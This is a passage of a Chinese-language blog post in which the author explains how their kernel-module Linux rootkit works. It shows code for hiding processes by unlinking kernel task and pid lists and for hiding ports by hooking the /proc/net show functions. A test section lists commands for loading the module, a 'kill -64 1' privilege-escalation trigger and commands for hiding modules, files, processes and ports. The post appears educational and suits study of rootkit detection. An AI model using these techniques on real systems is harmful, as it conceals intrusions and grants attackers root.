+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent</span> &#123;</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_ino;     <span class="hljs-comment">/* Inode number */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_off;     <span class="hljs-comment">/* Offset to next linux_dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen;  <span class="hljs-comment">/* Length of this linux_dirent */</span><br>               <span class="hljs-keyword">char</span>           d_name[];  <span class="hljs-comment">/* Filename (null-terminated) */</span><br>                                 <span class="hljs-comment">/* length is actually (d_reclen - 2 -</span><br><span class="hljs-comment">                                    offsetof(struct linux_dirent, d_name)) */</span><br>               <span class="hljs-comment">/*</span><br><span class="hljs-comment">               char           pad;       // Zero padding byte</span><br><span class="hljs-comment">               char           d_type;    // File type (only since Linux</span><br><span class="hljs-comment">                                         // 2.6.4); offset is (d_reclen - 1)</span><br><span class="hljs-comment">               */</span><br>           &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> &#123;</span><br>               <span class="hljs-keyword">ino64_t</span>        d_ino;    <span class="hljs-comment">/* 64-bit inode number */</span><br>               <span class="hljs-keyword">off64_t</span>        d_off;    <span class="hljs-comment">/* 64-bit offset to next structure */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen; <span class="hljs-comment">/* Size of this dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>  d_type;   <span class="hljs-comment">/* File type */</span><br>               <span class="hljs-keyword">char</span>           d_name[]; <span class="hljs-comment">/* Filename (null-terminated) */</span><br>           &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>对于getdents函数的hook，与getdents64函数的hook有一些不同，这里暂且略去</p>
+<h1 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h1><p>linux内核维护了task_struct和pid两个链表，分布记录了进程的task_struct结构和pid结构</p>
+<p>想要查看当前是否有rootkit进程有两个常规操作：</p>
+<ul>
+<li>遍历task_struct链表</li>
+<li>遍历/proc/pid中所有进程</li>
+</ul>
+<p>要想隐藏进程，就要考虑将rootkit相关的task struct和pid都摘除列表，即要从下面两点出发：</p>
+<ul>
+<li><p>脱离 task_struct 链表</p>
+</li>
+<li><p>脱离 pid 链表</p>
+</li>
+</ul>
+<p>那么首先看下linux中使用的相关的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span></span><br><span class="hljs-class">&#123;</span><br>	<span class="hljs-keyword">refcount_t</span> count;<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> level;<br>	<span class="hljs-comment">// lists of tasks that use this pid </span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span> <span class="hljs-title">tasks</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><br>	<span class="hljs-comment">// wait queue for pidfd notifications </span><br>	<span class="hljs-keyword">wait_queue_head_t</span> wait_pidfd;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">upid</span> <span class="hljs-title">numbers</span>[1];</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    ......<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>			*<span class="hljs-title">thread_pid</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span>		<span class="hljs-title">pid_links</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><span class="hljs-comment">//找task struct中的对应的pid hlist_node</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>		<span class="hljs-title">thread_group</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>		<span class="hljs-title">thread_node</span>;</span><br>    ......<br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// #ifdef CONFIG_TASKS_RCU </span></span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_info</span>		<span class="hljs-title">sched_info</span>;</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>		<span class="hljs-title">tasks</span>;</span> list_head 通过list_head将当前进程的task_struct串联进内核的进程列表中<br>    .....<br>    &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> *<span class="hljs-title">next</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> **<span class="hljs-title">pprev</span>;</span><br>    <span class="hljs-comment">//需要注意的是pprev是指针的指针,它指向的是前一个节点的next指针；其中首元素的pprev指向链表头的fist字段，末元素的next为NULL. </span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>相关的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct task_struct *<span class="hljs-title">pid_task</span><span class="hljs-params">(struct pid *pid, <span class="hljs-keyword">enum</span> pid_type type)</span> <span class="hljs-comment">//用于根据pid和其类型找到对应的task_struct</span></span><br><span class="hljs-function"><span class="hljs-title">find_vpid</span><span class="hljs-params">()</span><span class="hljs-comment">//用于根据nr也就是namespace下的局部pid找到对应的struct pid结构体</span></span><br><span class="hljs-function"><span class="hljs-comment">//使用的链表操作相关的函数</span></span><br><span class="hljs-function"><span class="hljs-title">list_add</span><span class="hljs-params">()</span><span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_del</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_add_head_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_add_tail_rcu</span><span class="hljs-params">()</span>  <span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_HLIST_NODE</span><span class="hljs-params">()</span><span class="hljs-comment">//初始化链表结点</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_LIST_HEAD</span><span class="hljs-params">()</span><span class="hljs-comment">//初始化链表头</span></span><br><span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span><span class="hljs-params">()</span><span class="hljs-comment">//相当于遍历整个双向循环链表,遍历时会存下下一个节点的数据结构,方便对当前项进行删除</span></span><br><span class="hljs-function"><span class="hljs-comment">//内存操作</span></span><br><span class="hljs-function"><span class="hljs-title">kmalloc</span><span class="hljs-params">()</span><span class="hljs-comment">//申请内存存储hide_node结构</span></span><br><span class="hljs-function"><span class="hljs-title">kfree</span><span class="hljs-params">()</span><span class="hljs-comment">//释放hide_node结构占用的内存</span></span><br></code></pre></td></tr></table></figure>
+
+<p>自定义的数据结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//进程隐藏的存储链表</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">hide_list_header</span>=</span>LIST_HEAD_INIT(hide_list_header);<br><span class="hljs-comment">//进程隐藏的存储结点</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hide_node</span>&#123;</span><br>	<span class="hljs-keyword">pid_t</span> <span class="hljs-keyword">pid_victim_t</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>* <span class="hljs-title">task_use_t</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">hide_list_header_t</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>使用的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hide_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//隐藏进程</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//恢复隐藏的进程</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_all</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//恢复所有进程</span><br></code></pre></td></tr></table></figure>
+
+<p>大致的流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hide_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>根据pid用find_vpid()找到对应的pid结构体</p>
+</li>
+<li><p>成功找到pid结构体后利用pid_task()找到对应的task struct</p>
+</li>
+<li><p>利用链表操作函数hlist_del_rcu对task struct 结点进行脱链，并用INIT_HLIST_NODE设置task struct 的前后指针</p>
+</li>
+<li><p>然后根据task struct 找到对应的pid 的结点，利用hlist_del_rcu进行脱链，INIT_HLIST_NODE设置其指针为空，并将pprev指向自身。</p>
+</li>
+</ul>
+<p>此时进程已经成功摘除链表被隐藏，但是需要记录对应结构，方便之后恢复</p>
+<ul>
+<li>用kmalloc申请一个hide_node类型结点的空间，设置对应的pid号和task struct指针，并通过list_head将其增加到hide_list_header 链表上进行记录</li>
+</ul>
+<p>到此完成隐藏进程功能，并未后面恢复做准备</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>通过list_for_each_entry_safe来遍历hide_list_header链表，直到找到和pid对应的hide_node的进程。然后利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_all(<span class="hljs-keyword">void</span>);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>这里同样通过list_for_each_entry_safe来遍历hide_list_header链表</li>
+<li>针对其中的每一个隐藏的进程，利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表</li>
+</ul>
+<h1 id="端口隐藏"><a href="#端口隐藏" class="headerlink" title="端口隐藏"></a>端口隐藏</h1><blockquote>
+<p>端口隐藏即隐藏已经被使用的端口，在linux中查看已经使用的端口有两个命令，一个是netstat，一个是ss，两个命令调用的系统调用不同，因此实际隐藏的过程也不同</p>
+</blockquote>
+<ul>
+<li>netstat在读取端口信息时会读取以下四个文件（对应的网络协议为tcp、udp、tcp6、udp6）：/proc/net/tcp、/proc/net/udp、/proc/net/tcp6/、/proc/net/udp6</li>
+<li>这几个文件都是序列文件，即seq_file，seq_file定义的结构体如下</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br>	<span class="hljs-keyword">char</span> *buf; <span class="hljs-comment">//缓冲区</span><br>	<span class="hljs-keyword">size_t</span> size;<br>	<span class="hljs-keyword">size_t</span> from;<br>	<span class="hljs-keyword">size_t</span> count; <span class="hljs-comment">//缓冲区长度</span><br>	<span class="hljs-keyword">size_t</span> pad_until;<br>	<span class="hljs-keyword">loff_t</span> index;<br>	<span class="hljs-keyword">loff_t</span> read_pos;<br>	u64 version;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br>	<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span>  <span class="hljs-comment">// important</span><br>	<span class="hljs-keyword">int</span> poll_event;<br>	<span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>	<span class="hljs-keyword">void</span> *<span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>seq_operations定义的结构体为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>	<span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br>	<span class="hljs-keyword">void</span> (*stop) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>	<span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br>	<span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>seq_operations的show函数即为netstat要输出的信息，我们只需要将该函数的 hook掉，在hook之前需要先保存show函数的地址，对应的函数为set_seq_opeartions</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_seq_operations</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* open_path,struct seq_operations** operations)</span></span>; <span class="hljs-comment">// open_path是打开的序列文件，operations是要保存的show函数的真实地址</span><br></code></pre></td></tr></table></figure>
+
+<p>我们在全局变量中声明了一个链表，变量名为hidden_port_list_head，它的作用为存储需要被隐藏的端口的信息，当想隐藏端口时，调用<strong>hide_connect</strong>函数，它的定义为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>其中type为网络类型(tcp/udp/tcp6/udp6)，port为端口号，该函数会将需要隐藏的端口添加到链表上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">node = kmalloc(<span class="hljs-keyword">sizeof</span>(struct port_node), GFP_KERNEL);<br>node-&gt;port = port;<br>node-&gt;type = type;<br><br><span class="hljs-comment">// 向链表中添加节点</span><br>list_add_tail(&amp;node-&gt;<span class="hljs-built_in">list</span>, &amp;hidden_port_list_head);<br></code></pre></td></tr></table></figure>
+
+<p>当不想隐藏该端口时，使用<strong>hide_unconnect</strong>函数将该节点从链表中删除</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span>&#123;<br>    list_for_each_entry_safe(entry, next_entry, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>        <span class="hljs-keyword">if</span> (entry-&gt;port == port &amp;&amp; entry-&gt;type == type)&#123;<br>            pr_info(<span class="hljs-string">&quot;Unhiding: %d&quot;</span>, port);<br>            list_del(&amp;entry-&gt;<span class="hljs-built_in">list</span>); <span class="hljs-comment">// 将要隐藏的节点从链表中删除</span><br>            kfree(entry);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>隐藏端口的链表会在我们定义的hook函数中用到</p>
+<p>首先要让定义的hook函数的参数与需要被hook的函数参数相同</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fake_seq_show</span><span class="hljs-params">(struct seq_file *seq, <span class="hljs-keyword">void</span> *v)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>hook函数首先判断网络类型，之后调用原show函数，如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (seq-&gt;op == tcp_operations)&#123;<br>    type = TCP_CONNECT;<br>    <span class="hljs-comment">//调用原有的tcp show函数</span><br>    ret = tcp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp_operations)&#123;<br>    type = UDP_CONNECT;<br>    ret = udp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == tcp6_operations)&#123;<br>    type = TCP6_CONNECT;<br>    ret = tcp6_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp6_operations)&#123;<br>    type = UDP6_CONNECT;<br>    ret = udp6_seq_fun(seq,v);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>show函数会将需要展示的端口信息放在seq-&gt;buf中，而seq-&gt;count记录了buf的缓冲区长度，代码的逻辑为判断新增的缓冲区的字符串是否和想要的隐藏的端口信息相同，如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 对hidden_port_list_head遍历</span><br>list_for_each_entry(node, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>    <span class="hljs-keyword">if</span> (type == node-&gt;type)&#123;<br>        <span class="hljs-comment">// seq-&gt;buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf</span><br>        <span class="hljs-built_in">snprintf</span>(port_str_buf, PORT_STR_LEN, <span class="hljs-string">&quot;:%04X&quot;</span>, node-&gt;port);<br>        <span class="hljs-comment">// 之后将缓冲区的新增字符串和port_str_buf进行对比判断是否要过滤端口</span><br>        <span class="hljs-keyword">if</span> (strnstr(seq-&gt;buf + last_len, port_str_buf, this_len))&#123;<br>            pr_info(<span class="hljs-string">&quot;Hiding port: %d&quot;</span>, node-&gt;port);<br>            seq-&gt;count = last_len;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h1><p>模块编译、安装、卸载：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo make <br><br>sudo insmod rootkit.ko<br>   <br>sudo rmmod rootkit<br></code></pre></td></tr></table></figure>
+
+<p>提权：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span><br><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">64</span> <span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%8F%90%E6%9D%83.png" srcset="/img/loading.gif" lazyload></p>
+<p>模块隐藏与恢复</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidemodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showmodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png" srcset="/img/loading.gif" lazyload></p>
+<p>进程隐藏与恢复</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png" srcset="/img/loading.gif" lazyload></p>
+<p>文件隐藏与恢复</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidefile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showfile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/LaPhilosophie/hello-rootkit/blob/main/image/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F&%E6%81%A2%E5%A4%8D.png?raw=true" srcset="/img/loading.gif" lazyload></p>
+<p>端口隐藏与恢复</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E7%AB%AF%E5%8F%A3%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png" srcset="/img/loading.gif" lazyload></p>
+<p>参考资料</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.ouah.org/LKM_HACKING.html">(nearly) Complete Linux Loadable Kernel Modules</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/milabs/awesome-linux-rootkits">awesome-linux-rootkits</a></li>
+<li><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/07/07/CODE-0X01-rootkit/">简易 Linux rootkit 编写入门指北</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile">Reptile</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ivyl/rootkit">Sample rootkit for Linux</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1871/">【rootkit 系列研究】rootkit 检测技术发展现状</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/plusls/rootkit">https://github.com/plusls/rootkit</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/TangentHuang/ucas-rootkit">https://github.com/TangentHuang/ucas-rootkit</a></li>
+<li><a target="_blank" rel="noopener" href="https://xcellerator.github.io/posts/linux_rootkits_07/">https://xcellerator.github.io/posts/linux_rootkits_07/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs">https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/vkobel/linux-syscall-hook-rootkit">https://github.com/vkobel/linux-syscall-hook-rootkit</a></li>
+<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/2/getdents64">https://linux.die.net/man/2/getdents64</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>一个基于 LKM 的 Linux 内核级 rootkit 的实现</div>
+      <div>http://gls.show/p/cd0d68e2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月30日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
